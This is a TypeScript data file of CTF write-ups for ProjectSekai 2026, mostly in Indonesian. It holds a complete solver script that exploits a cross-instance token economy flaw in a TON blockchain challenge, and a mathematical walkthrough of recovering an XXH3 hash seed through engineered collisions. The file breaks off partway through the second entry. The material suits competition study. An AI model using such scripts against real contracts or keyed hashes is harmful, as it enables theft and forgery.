import type { WriteUp } from "../types";

export const projectSekai2026Writeups: WriteUp[] = [
  {
    "id": "projectsekai2026-blockchain-openworld",
    "title": "Open World",
    "category": "Blockchain",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Service ini bikin instance challenge terpisah, tapi semuanya tetap hidup di chain yang sama. Bonus `PlayerBonus` cuma kasih `50` jetton per instance, jadi satu instance doang tidak cukup buat `Solve` yang butuh `100`.",
    "problemDescription": "Service ini bikin instance challenge terpisah, tapi semuanya tetap hidup di chain yang sama. Bonus `PlayerBonus` cuma kasih `50` jetton per instance, jadi satu instance doang tidak cukup buat `Solve` yang butuh `100`.\n\nCelahnya ada di model ekonominya, bukan di memory corruption:\n\n- Jetton hasil bonus bisa dijual balik ke challenge lewat payload `Sell`.\n- Hasil jualannya dibayar dalam TON ke wallet player.\n- TON itu bebas ditransfer ke wallet player di instance lain.\n- Instance target tetap bisa klaim bonus `50`, lalu beli `50` lagi pakai TON kiriman donor.\n\nDetail penting yang bikin exploit stabil:\n\n- `Sell` dan `Solve` harus dikirim lewat `AskToTransfer` ke jetton wallet player.\n- `forwardTonAmount` harus non-zero. Kalau `0`, jetton wallet tidak mengirim `TransferNotificationForRecipient`, jadi challenge tidak pernah melihat payload `Sell` atau `Solve`.\n- Nilai yang saya pakai aman:\n  - `Sell`: transfer `50` jetton, `forwardTonAmount = 0.05 TON`, value kirim `0.35 TON`\n  - `Buy 50`: value kirim `100.2 TON`\n  - `Solve`: transfer `100` jetton, `forwardTonAmount = 0.05 TON`, value kirim `0.35 TON`\n\nLangkah eksploitasi:\n\n1. Buat dua instance: donor dan target.\n2. Donor klaim bonus `50` jetton.\n3. Target klaim bonus `50` jetton.\n4. Donor kirim `Sell` untuk `50` jetton dan terima `100 TON`.\n5. Donor transfer `100 TON` ke wallet target.\n6. Target kirim `Buy(50)` ke challenge.\n7. Target sekarang punya `100` jetton.\n8. Target transfer `100` jetton ke challenge dengan payload `Solve`.\n9. Ambil flag lewat menu `flag`.\n\nRun:\n\n```bash\npython3 solve.py --host open-world-6a1fda4f080c.instancer.sekai.team\n```\n\nSolver butuh dependency Node di repo ini:\n\n```bash\nnpm ci\n```\n\nFlag yang saya dapat:\n\n```text\nSEKAI{3Xp1or1ng-An-0pen-W0rld-15-FUN}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport hashlib\r\nimport json\r\nimport re\r\nimport socket\r\nimport ssl\r\nimport subprocess\r\nimport sys\r\nimport textwrap\r\nimport time\r\nfrom pathlib import Path\r\n\r\n\r\nDEFAULT_HOST = \"open-world-6a1fda4f080c.instancer.sekai.team\"\r\nPORT = 1337\r\nSCRIPT_DIR = Path(__file__).resolve().parent\r\n\r\nPOW_RE = re.compile(r'sha256\\(\"([0-9a-f]+)\" \\+ YOUR_INPUT\\) must start with (\\d+) bytes zeros')\r\nUUID_RE = re.compile(r\"uuid: ([0-9a-f-]+)\")\r\nCHALLENGE_RE = re.compile(r\"challenge contract: (\\S+)\")\r\nAPI_RE = re.compile(r\"api v2: (\\S+)\")\r\nWALLET_ID_RE = re.compile(r\"your wallet id: (\\d+)\")\r\nSEED_RE = re.compile(r\"seed: ([0-9a-f]+)\")\r\n\r\n\r\ndef recv_until(sock: ssl.SSLSocket, marker: str | None = None, timeout: float = 30.0) -> str:\r\n    end = time.time() + timeout\r\n    data = bytearray()\r\n    marker_bytes = marker.encode() if marker else None\r\n    while time.time() < end:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        data.extend(chunk)\r\n        if marker_bytes and marker_bytes in data:\r\n            break\r\n    return data.decode(errors=\"ignore\")\r\n\r\n\r\ndef solve_pow(prefix: str, difficulty: int) -> str:\r\n    i = 0\r\n    target = \"0\" * difficulty\r\n    while True:\r\n        suffix = str(i)\r\n        if hashlib.sha256((prefix + suffix).encode()).hexdigest().startswith(target):\r\n            return suffix\r\n        i += 1\r\n\r\n\r\ndef parse_instance(text: str) -> dict[str, str]:\r\n    uuid = UUID_RE.search(text)\r\n    challenge = CHALLENGE_RE.search(text)\r\n    api_v2 = API_RE.search(text)\r\n    wallet_id = WALLET_ID_RE.search(text)\r\n    seed = SEED_RE.search(text)\r\n    if not all([uuid, challenge, api_v2, wallet_id, seed]):\r\n        raise RuntimeError(f\"failed to parse instance info:\\n{text}\")\r\n    return {\r\n        \"uuid\": uuid.group(1),\r\n        \"challenge\": challenge.group(1),\r\n        \"api_v2\": api_v2.group(1),\r\n        \"walletId\": int(wallet_id.group(1)),\r\n        \"seed\": seed.group(1),\r\n    }\r\n\r\n\r\ndef connect(host: str) -> ssl.SSLSocket:\r\n    raw = socket.create_connection((host, PORT), timeout=10)\r\n    ctx = ssl.create_default_context()\r\n    sock = ctx.wrap_socket(raw, server_hostname=host)\r\n    sock.settimeout(90)\r\n    return sock\r\n\r\n\r\ndef create_instance(host: str) -> dict[str, str]:\r\n    with connect(host) as sock:\r\n        banner = recv_until(sock, \"action? \", 15)\r\n        if \"action?\" not in banner:\r\n            raise RuntimeError(f\"unexpected banner: {banner!r}\")\r\n        sock.sendall(b\"1\\n\")\r\n        pow_text = recv_until(sock, \"YOUR_INPUT = \", 20)\r\n        match = POW_RE.search(pow_text)\r\n        if not match:\r\n            raise RuntimeError(f\"failed to parse pow:\\n{pow_text}\")\r\n        prefix, difficulty = match.group(1), int(match.group(2))\r\n        suffix = solve_pow(prefix, difficulty)\r\n        sock.sendall((suffix + \"\\n\").encode())\r\n        instance_text = recv_until(sock, timeout=90)\r\n        return parse_instance(instance_text)\r\n\r\n\r\ndef fetch_flag(host: str, uuid: str) -> str:\r\n    with connect(host) as sock:\r\n        banner = recv_until(sock, \"action? \", 15)\r\n        if \"action?\" not in banner:\r\n            raise RuntimeError(f\"unexpected banner while fetching flag: {banner!r}\")\r\n        sock.sendall(b\"2\\n\")\r\n        prompt = recv_until(sock, \"uuid? \", 15)\r\n        if \"uuid?\" not in prompt:\r\n            raise RuntimeError(f\"unexpected flag prompt: {prompt!r}\")\r\n        sock.sendall((uuid + \"\\n\").encode())\r\n        response = recv_until(sock, timeout=15).strip()\r\n        return response\r\n\r\n\r\ndef run_exploit(donor: dict[str, str], target: dict[str, str]) -> str:\r\n    if not (SCRIPT_DIR / \"node_modules\" / \"@ton\" / \"ton\").exists():\r\n        raise RuntimeError(\"missing node_modules. run `npm ci` in this directory first\")\r\n\r\n    donor_cfg = {\r\n        \"uuid\": donor[\"uuid\"],\r\n        \"endpoint\": donor[\"api_v2\"] + \"/jsonRPC\",\r\n        \"challenge\": donor[\"challenge\"],\r\n        \"walletId\": donor[\"walletId\"],\r\n        \"seed\": donor[\"seed\"],\r\n    }\r\n    target_cfg = {\r\n        \"uuid\": target[\"uuid\"],\r\n        \"endpoint\": target[\"api_v2\"] + \"/jsonRPC\",\r\n        \"challenge\": target[\"challenge\"],\r\n        \"walletId\": target[\"walletId\"],\r\n        \"seed\": target[\"seed\"],\r\n    }\r\n\r\n    js = textwrap.dedent(\r\n        f\"\"\"\r\n        const {{ TonClient, WalletContractV3R2 }} = require('@ton/ton');\r\n        const {{ Address, beginCell, TupleBuilder, toNano }} = require('@ton/core');\r\n        const {{ keyPairFromSeed }} = require('@ton/crypto');\r\n\r\n        const DONOR = {json.dumps(donor_cfg)};\r\n        const TARGET = {json.dumps(target_cfg)};\r\n        DONOR.challenge = Address.parse(DONOR.challenge);\r\n        TARGET.challenge = Address.parse(TARGET.challenge);\r\n\r\n        const sleep = (ms) => new Promise(r => setTimeout(r, ms));\r\n        async function retry(label, fn, attempts = 12, delay = 1200) {{\r\n          let last;\r\n          for (let i = 1; i <= attempts; i++) {{\r\n            try {{\r\n              return await fn();\r\n            }} catch (e) {{\r\n              last = e;\r\n              console.error(`[${{label}}] try ${{i}}/${{attempts}}: ${{e.message}}`);\r\n              await sleep(delay);\r\n            }}\r\n          }}\r\n          throw last;\r\n        }}\r\n        function mkCtx(cfg) {{\r\n          const client = new TonClient({{ endpoint: cfg.endpoint, timeout: 60000 }});\r\n          const keyPair = keyPairFromSeed(Buffer.from(cfg.seed, 'hex'));\r\n          const wallet = client.open(WalletContractV3R2.create({{ workchain: -1, publicKey: keyPair.publicKey, walletId: cfg.walletId }}));\r\n          return {{ ...cfg, client, wallet, sender: wallet.sender(keyPair.secretKey) }};\r\n        }}\r\n        async function waitSeq(ctx, oldSeq) {{\r\n          for (let i = 0; i < 50; i++) {{\r\n            const seq = await retry('getSeqno', () => ctx.wallet.getSeqno(), 6, 1000);\r\n            if (seq > oldSeq) return seq;\r\n            await sleep(1200);\r\n          }}\r\n          throw new Error('seqno did not increase');\r\n        }}\r\n        async function getMinter(ctx) {{\r\n          return retry('minter', async () => (await ctx.client.runMethod(ctx.challenge, 'minter')).stack.readAddress());\r\n        }}\r\n        async function getJettonWallet(ctx, ownerAddr) {{\r\n          const minter = await getMinter(ctx);\r\n          return retry('get_wallet_address', async () => {{\r\n            const tb = new TupleBuilder();\r\n            tb.writeAddress(ownerAddr);\r\n            return (await ctx.client.runMethod(minter, 'get_wallet_address', tb.build())).stack.readAddress();\r\n          }});\r\n        }}\r\n        async function getJettonBalance(ctx, ownerAddr = ctx.wallet.address) {{\r\n          const jw = await getJettonWallet(ctx, ownerAddr);\r\n          const state = await retry('jetton state', () => ctx.client.getContractState(jw));\r\n          if (state.state !== 'active') return 0n;\r\n          return retry('jetton data', async () => (await ctx.client.runMethod(jw, 'get_wallet_data')).stack.readBigNumber());\r\n        }}\r\n        async function waitJettonAtLeast(ctx, amount) {{\r\n          for (let i = 0; i < 50; i++) {{\r\n            const bal = await getJettonBalance(ctx);\r\n            console.log(ctx.uuid, 'jettons', bal.toString());\r\n            if (bal >= amount) return bal;\r\n            await sleep(1500);\r\n          }}\r\n          throw new Error('jetton amount not reached');\r\n        }}\r\n        async function waitTonAtLeast(ctx, amount) {{\r\n          for (let i = 0; i < 50; i++) {{\r\n            const bal = await retry('ton balance', () => ctx.client.getBalance(ctx.wallet.address));\r\n            console.log(ctx.uuid, 'ton', bal.toString());\r\n            if (bal >= amount) return bal;\r\n            await sleep(1500);\r\n          }}\r\n          throw new Error('ton amount not reached');\r\n        }}\r\n        async function claimBonus(ctx) {{\r\n          const body = beginCell().storeUint(0x13370002, 32).endCell();\r\n          const seq = await retry('seq before bonus', () => ctx.wallet.getSeqno());\r\n          await retry('send bonus', () => ctx.sender.send({{ to: ctx.challenge, value: toNano('0.25'), bounce: true, body }}));\r\n          await waitSeq(ctx, seq);\r\n        }}\r\n        async function sell50(ctx) {{\r\n          const jw = await getJettonWallet(ctx, ctx.wallet.address);\r\n          const sellPayload = beginCell().storeUint(0x13370004, 32).endCell();\r\n          const body = beginCell()\r\n            .storeUint(0x0f8a7ea5, 32)\r\n            .storeUint(0, 64)\r\n            .storeCoins(50n)\r\n            .storeAddress(ctx.challenge)\r\n            .storeAddress(ctx.wallet.address)\r\n            .storeMaybeRef(null)\r\n            .storeCoins(toNano('0.05'))\r\n            .storeSlice(sellPayload.beginParse())\r\n            .endCell();\r\n          const seq = await retry('seq before sell', () => ctx.wallet.getSeqno());\r\n          await retry('send sell', () => ctx.sender.send({{ to: jw, value: toNano('0.35'), bounce: true, body }}));\r\n          await waitSeq(ctx, seq);\r\n        }}\r\n        async function sendTon(from, toAddr, amountTon) {{\r\n          const seq = await retry('seq before ton xfer', () => from.wallet.getSeqno());\r\n          await retry('send ton xfer', () => from.sender.send({{ to: toAddr, value: toNano(amountTon), bounce: false }}));\r\n          await waitSeq(from, seq);\r\n        }}\r\n        async function buy50(ctx) {{\r\n          const body = beginCell().storeUint(0x13370003, 32).storeCoins(50n).endCell();\r\n          const seq = await retry('seq before buy', () => ctx.wallet.getSeqno());\r\n          await retry('send buy', () => ctx.sender.send({{ to: ctx.challenge, value: toNano('100.2'), bounce: true, body }}));\r\n          await waitSeq(ctx, seq);\r\n        }}\r\n        async function solve100(ctx) {{\r\n          const jw = await getJettonWallet(ctx, ctx.wallet.address);\r\n          const solvePayload = beginCell().storeUint(0x13370005, 32).endCell();\r\n          const body = beginCell()\r\n            .storeUint(0x0f8a7ea5, 32)\r\n            .storeUint(0, 64)\r\n            .storeCoins(100n)\r\n            .storeAddress(ctx.challenge)\r\n            .storeAddress(ctx.wallet.address)\r\n            .storeMaybeRef(null)\r\n            .storeCoins(toNano('0.05'))\r\n            .storeSlice(solvePayload.beginParse())\r\n            .endCell();\r\n          const seq = await retry('seq before solve', () => ctx.wallet.getSeqno());\r\n          await retry('send solve', () => ctx.sender.send({{ to: jw, value: toNano('0.35'), bounce: true, body }}));\r\n          await waitSeq(ctx, seq);\r\n        }}\r\n        async function waitSolved(ctx) {{\r\n          for (let i = 0; i < 40; i++) {{\r\n            const solved = await retry('isSolved', async () => (await ctx.client.runMethod(ctx.challenge, 'isSolved')).stack.readBoolean());\r\n            console.log(ctx.uuid, 'solved', solved);\r\n            if (solved) return true;\r\n            await sleep(1500);\r\n          }}\r\n          throw new Error('challenge not solved');\r\n        }}\r\n\r\n        (async () => {{\r\n          const donor = mkCtx(DONOR);\r\n          const target = mkCtx(TARGET);\r\n          console.log('donor wallet', donor.wallet.address.toString());\r\n          console.log('target wallet', target.wallet.address.toString());\r\n\r\n          await claimBonus(donor);\r\n          await claimBonus(target);\r\n          await waitJettonAtLeast(donor, 50n);\r\n          await waitJettonAtLeast(target, 50n);\r\n\r\n          await sell50(donor);\r\n          await waitTonAtLeast(donor, toNano('100'));\r\n\r\n          await sendTon(donor, target.wallet.address, '100.0');\r\n          await waitTonAtLeast(target, toNano('100.5'));\r\n\r\n          await buy50(target);\r\n          await waitJettonAtLeast(target, 100n);\r\n\r\n          await solve100(target);\r\n          await waitSolved(target);\r\n          console.log('SOLVED_UUID=' + target.uuid);\r\n        }})().catch((e) => {{\r\n          console.error('FATAL', e);\r\n          process.exit(1);\r\n        }});\r\n        \"\"\"\r\n    )\r\n\r\n    proc = subprocess.run(\r\n        [\"node\", \"-e\", js],\r\n        cwd=SCRIPT_DIR,\r\n        text=True,\r\n        capture_output=True,\r\n    )\r\n    sys.stdout.write(proc.stdout)\r\n    sys.stderr.write(proc.stderr)\r\n    if proc.returncode != 0:\r\n        raise RuntimeError(\"node exploit failed\")\r\n    solved = re.search(r\"SOLVED_UUID=([0-9a-f-]+)\", proc.stdout)\r\n    if not solved:\r\n        raise RuntimeError(\"failed to parse solved uuid\")\r\n    return solved.group(1)\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=DEFAULT_HOST)\r\n    args = parser.parse_args()\r\n\r\n    donor = create_instance(args.host)\r\n    target = create_instance(args.host)\r\n    solved_uuid = run_exploit(donor, target)\r\n    flag = fetch_flag(args.host, solved_uuid)\r\n    print(flag)\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{3Xp1or1ng-An-0pen-W0rld-15-FUN}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-crypto-lihash",
    "title": "Iihash — SEKAI CTF 2026",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Writeup for challenge Iihash — SEKAI CTF 2026",
    "problemDescription": "Ada dua tahap utama:\n\n1. **Memulihkan seed 64-bit** menggunakan collision terpilih pada accumulator XXH3 long-input.\n2. **Membuat preimage 320 byte** setelah seed diketahui. State target dihitung dengan membalik avalanche, nilai accumulator target dicari menggunakan LLL/BKZ, lalu word payload dirakit secara algebraic.\n\nAlur lengkapnya:\n\n```text\nchosen-input hash oracle\n        ↓\nexact accumulator collision\n        ↓\nrecover seed_low dengan x+y dan x XOR y\n        ↓\nrecover seed_high dengan carry/borrow yang sudah diketahui\n        ↓\ninvert avalanche target digest\n        ↓\ninvert fold128 memakai lattice 66 dimensi\n        ↓\nrakit payload 320 byte\n        ↓\nxxh3_128(payload, seed) = b\"Give me the flag\"\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Kategori:** Crypto\n- **Judul:** Iihash\n- **Deskripsi:** `Fast hash is good hash. A secret seed makes it even better, right?`\n- **Target:** membuat input lebih dari 256 byte dengan digest XXH3-128 tepat `b\"Give me the flag\"`\n\n\n\nFlag yang didapat:\n\n\n\n---",
        "code": "self.seed = random.getrandbits(64)\n\nh = xxhash.xxh3_128(data, seed=self.seed).hexdigest()\n\nif xxhash.xxh3_128(data, seed=self.seed).digest() == b\"Give me the flag\":\n    print(open(\"flag.txt\").read())"
      },
      {
        "title": "1. Custom Secret dari Seed",
        "content": "Pada long-input mode, XXH3 tidak memasukkan seed sebagai key ke primitive kriptografis. Seed hanya dipakai untuk memodifikasi default secret per word 64-bit.\n\nUntuk pasangan word ke-`i`:\n\n\\[\nS_{2i}=C_{2i}+s \\pmod{2^{64}}\n\\]\n\n\\[\nS_{2i+1}=C_{2i+1}-s \\pmod{2^{64}}\n\\]\n\n`C_i` adalah word dari default secret dan `s` adalah seed 64-bit.\n\nTuliskan seed sebagai dua half 32-bit:\n\n\\[\ns=s_H 2^{32}+s_L\n\\]\n\nUntuk word bertanda tambah, jika:\n\n\\[\nC=C_H2^{32}+C_L\n\\]\n\nmaka:\n\n\\[\nL_+ = C_L+s_L \\pmod{2^{32}}\n\\]\n\n\\[\nH_+ = C_H+s_H+\\kappa \\pmod{2^{32}}\n\\]\n\n dengan carry:\n\n\\[\n\\kappa=[C_L+s_L\\ge 2^{32}]\n\\]\n\nUntuk word bertanda kurang:\n\n\\[\nL_- = C_L-s_L \\pmod{2^{32}}\n\\]\n\n\\[\nH_- = C_H-s_H-\\beta \\pmod{2^{32}}\n\\]\n\n dengan borrow:\n\n\\[\n\\beta=[C_L<s_L]\n\\]\n\nStruktur `+s` dan `-s` ini membuat seed hilang ketika dua word dengan parity berbeda dijumlahkan.\n\n---"
      },
      {
        "title": "2. Update Accumulator",
        "content": "Satu stripe berisi delapan word data 64-bit. Untuk lane `l`, definisikan:\n\n\\[\nd=d_H2^{32}+d_L\n\\]\n\n\\[\nk=k_H2^{32}+k_L\n\\]\n\n\\[\nq=d\\oplus k\n\\]\n\nXXH3 memperbarui accumulator dengan:\n\n\\[\nA_{l\\oplus1}\\leftarrow A_{l\\oplus1}+d \\pmod{2^{64}}\n\\]\n\n\\[\nA_l\\leftarrow A_l+\n\\operatorname{lo}_{32}(q)\\cdot\n\\operatorname{hi}_{32}(q)\n\\pmod{2^{64}}\n\\]\n\natau:\n\n\\[\nA_l\\leftarrow A_l+(d_L\\oplus k_L)(d_H\\oplus k_H)\n\\pmod{2^{64}}\n\\]\n\nAda dua properti penting:\n\n- accumulator pasangan menerima **penjumlahan linear** word data;\n- accumulator lane sendiri menerima **perkalian dua nilai 32-bit**.\n\nCollision gadget dibuat agar penjumlahan data sama dan selisih perkalian tepat nol.\n\n---"
      },
      {
        "title": "3. Memulihkan XOR Low-Half Dua Secret Word",
        "content": "Ambil dua secret word yang digunakan pada lane sama tetapi stripe berbeda:\n\n\\[\nS_i=H_i2^{32}+L_i\n\\]\n\n\\[\nS_j=H_j2^{32}+L_j\n\\]\n\nKita ingin menguji tebakan:\n\n\\[\nR=L_i\\oplus L_j\n\\]\n\nPilih:\n\n\\[\n\\delta=2^b\n\\]\n\nlalu buat dua pesan yang hanya berbeda pada dua posisi tersebut."
      },
      {
        "title": "Pesan A",
        "content": "\\[\nd_i=0\n\\]\n\n\\[\nd_j=\\delta 2^{32}+R\n\\]"
      },
      {
        "title": "Pesan B",
        "content": "\\[\nd_i=\\delta 2^{32}\n\\]\n\n\\[\nd_j=R\n\\]\n\nJumlah data pada kedua pesan sama:\n\n\\[\nd_i^{(A)}+d_j^{(A)}=\n\\delta2^{32}+R\n\\]\n\n\\[\nd_i^{(B)}+d_j^{(B)}=\n\\delta2^{32}+R\n\\]\n\nMaka accumulator silang `A[lane XOR 1]` identik.\n\nSekarang hitung kontribusi perkalian pada accumulator lane.\n\nDefinisikan:\n\n\\[\nX=R\\oplus L_j\n\\]\n\nKontribusi Pesan A:\n\n\\[\nP_A=L_iH_i+X(H_j\\oplus\\delta)\n\\]\n\nKontribusi Pesan B:\n\n\\[\nP_B=L_i(H_i\\oplus\\delta)+XH_j\n\\]\n\nSelisihnya:\n\n\\[\nP_A-P_B=\nX[(H_j\\oplus\\delta)-H_j]\n-L_i[(H_i\\oplus\\delta)-H_i]\n\\]\n\nJika bit ke-`b` dari `H_i` dan `H_j` sama, toggle bit tersebut memiliki tanda yang sama. Ada `\\sigma\\in\\{-1,+1\\}` sehingga:\n\n\\[\n(H_j\\oplus\\delta)-H_j=\\sigma\\delta\n\\]\n\n\\[\n(H_i\\oplus\\delta)-H_i=\\sigma\\delta\n\\]\n\nJadi:\n\n\\[\nP_A-P_B=\n\\sigma\\delta(X-L_i)\n\\]\n\nCollision terjadi tepat ketika:\n\n\\[\nX=L_i\n\\]\n\nKarena `X=R XOR L_j`:\n\n\\[\nR\\oplus L_j=L_i\n\\]\n\nsehingga:\n\n\\[\n\\boxed{R=L_i\\oplus L_j}\n\\]\n\nJika tebakan `R` benar, seluruh delapan accumulator kedua pesan identik. Finalizer juga menerima state identik, sehingga digest 128-bit pasti sama.\n\nCollision ini bukan birthday collision dan bukan collision probabilistik. Ini collision internal yang dibangun secara algebraic.\n\n---"
      },
      {
        "title": "4. Mengapa Ada Bit High yang Pasti Sama",
        "content": "Gadget low-half membutuhkan satu bit `b` dengan:\n\n\\[\n(H_i)_b=(H_j)_b\n\\]\n\nUntuk pasangan parity berbeda, jumlah high-half diketahui sampai carry/borrow dari low-half:\n\n\\[\nH_i+H_j=Q_H\\pmod{2^{32}}\n\\]\n\nAmbil bit nol pertama dari `Q_H`, dihitung dari LSB.\n\nSemua bit lebih rendah adalah `1`. Mulai dari carry awal nol, bit hasil `1` memaksa operand berbeda dan carry tetap nol. Ketika mencapai bit nol pertama, carry masuk masih nol. Agar bit hasil nol, kedua operand harus sama:\n\n\\[\n0+0+0=0\n\\]\n\natau:\n\n\\[\n1+1+0=2\n\\]\n\nKeduanya memiliki bit operand yang sama. Karena itu bit nol pertama dari jumlah dapat dipakai sebagai toggle `b`.\n\nSaat low-half belum diketahui, ada beberapa kemungkinan carry akhir. Solver menghitung semua carry yang konsisten dengan sistem `x+y=Q` dan `x XOR y=R`, lalu mencoba bit aman yang dihasilkan.\n\n---"
      },
      {
        "title": "5. Gadget untuk XOR High-Half",
        "content": "Setelah kandidat low-half tersedia, kita dapat mencari bit low yang sama dan menukar peran high/low.\n\nKita ingin menguji:\n\n\\[\nR=H_i\\oplus H_j\n\\]\n\nPilih `delta=2^b` pada low-half."
      },
      {
        "title": "Pesan A",
        "content": "\\[\nd_i=0\n\\]\n\n\\[\nd_j=R2^{32}+\\delta\n\\]"
      },
      {
        "title": "Pesan B",
        "content": "\\[\nd_i=\\delta\n\\]\n\n\\[\nd_j=R2^{32}\n\\]\n\nJumlah data tetap sama. Jika bit ke-`b` dari `L_i` dan `L_j` sama, selisih perkalian menjadi:\n\n\\[\nP_A-P_B=\n\\sigma\\delta[(R\\oplus H_j)-H_i]\n\\]\n\nCollision terjadi tepat saat:\n\n\\[\n\\boxed{R=H_i\\oplus H_j}\n\\]\n\nPada tahap ini solver sudah memiliki sekumpulan kandidat `s_L`. Ia memilih bit `b` yang memenuhi:\n\n\\[\n(L_i\\oplus L_j)_b=0\n\\]\n\nuntuk semua kandidat yang masih hidup.\n\n---"
      },
      {
        "title": "6. Persamaan Low-Half",
        "content": "Pilih satu secret word parity genap dan satu parity ganjil:\n\n\\[\nx=C_{+,L}+s_L\\pmod{2^{32}}\n\\]\n\n\\[\ny=C_{-,L}-s_L\\pmod{2^{32}}\n\\]\n\nJumlahnya tidak mengandung seed:\n\n\\[\nx+y=C_{+,L}+C_{-,L}\\pmod{2^{32}}\n\\]\n\nDefinisikan:\n\n\\[\nQ=(C_{+,L}+C_{-,L})\\bmod 2^{32}\n\\]\n\nCollision oracle memberikan:\n\n\\[\nR=x\\oplus y\n\\]\n\nJadi kita memperoleh sistem:\n\n\\[\n\\boxed{x+y=Q\\pmod{2^{32}}}\n\\]\n\n\\[\n\\boxed{x\\oplus y=R}\n\\]\n\nSetelah menemukan `x`, low-half seed langsung:\n\n\\[\n\\boxed{s_L=x-C_{+,L}\\pmod{2^{32}}}\n\\]"
      },
      {
        "title": "Contoh dari sesi solve",
        "content": "Pasangan awal `(2,7)` memiliki:\n\n\\[\nC_{2,L}=\\texttt{0xe96dd4de}\n\\]\n\n\\[\nC_{7,L}=\\texttt{0xe69035e0}\n\\]\n\nMaka:\n\n\\[\nQ=\\texttt{0xe96dd4de}+\n\\texttt{0xe69035e0}\n\\pmod{2^{32}}\n\\]\n\n\\[\nQ=\\texttt{0xcffe0abe}\n\\]\n\nOracle menemukan:\n\n\\[\nR=\\texttt{0x2ff9caa0}\n\\]\n\nUntuk seed sesi:\n\n\\[\ns_L=\\texttt{0x702d0db1}\n\\]\n\nword aktualnya:\n\n\\[\nx=\\texttt{0x599ae28f}\n\\]\n\n\\[\ny=\\texttt{0x7663282f}\n\\]\n\nVerifikasi:\n\n\\[\nx+y=\\texttt{0xcffe0abe}=Q\n\\]\n\n\\[\nx\\oplus y=\\texttt{0x2ff9caa0}=R\n\\]\n\n---"
      },
      {
        "title": "7. Menyelesaikan `x+y=Q` dan `x XOR y=R`",
        "content": "Persamaan diselesaikan bit per bit dengan dynamic programming carry.\n\nUntuk bit ke-`k`, tulis:\n\n\\[\nx_k,y_k,q_k,r_k\\in\\{0,1\\}\n\\]\n\nDari XOR:\n\n\\[\ny_k=x_k\\oplus r_k\n\\]\n\nJika carry masuk adalah `c_k`, maka:\n\n\\[\nx_k+y_k+c_k=q_k+2c_{k+1}\n\\]\n\nUntuk setiap `c_k`, solver mencoba `x_k=0` dan `x_k=1`, menghitung `y_k`, lalu hanya menyimpan transisi yang menghasilkan bit `q_k` benar.\n\nPseudo-formula transisinya:\n\n\\[\nt=x_k+(x_k\\oplus r_k)+c_k\n\\]\n\nvalid jika:\n\n\\[\nt\\bmod 2=q_k\n\\]\n\nlalu:\n\n\\[\nc_{k+1}=\\lfloor t/2\\rfloor\n\\]\n\nSetelah 32 bit, seluruh kemungkinan `x` diperoleh. Banyaknya solusi untuk suatu `R` juga dihitung dengan DP yang sama.\n\nNilai `R` tidak memiliki peluang yang seragam. Solver mengurutkan tebakan berdasarkan:\n\n\\[\nN(Q,R)=\\#\\{x:x+(x\\oplus R)=Q\\}\n\\]\n\nSemakin besar `N(Q,R)`, semakin besar peluang relasi tersebut menjadi relasi seed acak. Ini menurunkan expected query count.\n\nPada sesi final:\n\n\n\nArtinya sistem sum/XOR tersebut memiliki 262.144 kandidat `x`, yang dipetakan menjadi 262.144 kandidat `s_L`.\n\n---",
        "code": "[+] low relation (2, 7): 0x2ff9caa0\n[+] candidates=262144"
      },
      {
        "title": "8. Filter Kandidat Low-Half",
        "content": "Setelah relasi pertama, kita tidak lagi perlu menghitung distribusi dari seluruh `2^32` seed.\n\nUntuk setiap kandidat `s_L`, hitung relasi prediksi pada pasangan baru:\n\n\\[\nR_{i,j}(s_L)=L_i(s_L)\\oplus L_j(s_L)\n\\]\n\nRelasi ini membagi kandidat ke beberapa bucket. Collision oracle menentukan bucket yang benar.\n\nOutput sesi final:\n\n\n\nSetiap filter bukan brute force ulang terhadap `2^32`; filter hanya menguji nilai relasi unik dari kandidat yang masih hidup.\n\n---",
        "code": "[+] low filter (0, 1): remain=2560\n[+] low filter (6, 9): remain=64\n[+] low filter (8, 11): remain=8\n[+] low filter (1, 4): remain=4\n[+] low filter (8, 9): remain=2"
      },
      {
        "title": "9. Persamaan High-Half",
        "content": "Setelah `s_L` diketahui atau tinggal sedikit kandidat, carry dan borrow dapat dihitung:\n\n\\[\n\\kappa=[C_{+,L}+s_L\\ge2^{32}]\n\\]\n\n\\[\n\\beta=[C_{-,L}<s_L]\n\\]\n\nHigh-half dua word adalah:\n\n\\[\nX=C_{+,H}+s_H+\\kappa\\pmod{2^{32}}\n\\]\n\n\\[\nY=C_{-,H}-s_H-\\beta\\pmod{2^{32}}\n\\]\n\nSeed high kembali hilang dari jumlah:\n\n\\[\nX+Y=\nC_{+,H}+C_{-,H}+\\kappa-\\beta\n\\pmod{2^{32}}\n\\]\n\nDefinisikan:\n\n\\[\nQ_H=C_{+,H}+C_{-,H}+\\kappa-\\beta\n\\pmod{2^{32}}\n\\]\n\nHigh collision gadget memberikan:\n\n\\[\nR_H=X\\oplus Y\n\\]\n\nKita menyelesaikan sistem yang sama:\n\n\\[\nX+Y=Q_H\\pmod{2^{32}}\n\\]\n\n\\[\nX\\oplus Y=R_H\n\\]\n\nSetelah `X` ditemukan:\n\n\\[\n\\boxed{s_H=X-C_{+,H}-\\kappa\\pmod{2^{32}}}\n\\]\n\nContoh relasi remote:\n\n\n\nUntuk seed final:\n\n\\[\ns_H=\\texttt{0xeed153b3}\n\\]\n\nSetelah intersection dan filter, kandidat terakhir diverifikasi memakai hash satu payload nol 320 byte.\n\nSeed lengkap:\n\n\\[\n\\boxed{s=\\texttt{0xeed153b3702d0db1}}\n\\]\n\nSeed berubah pada setiap koneksi, jadi nilai ini hanya berlaku pada sesi tersebut.\n\n---",
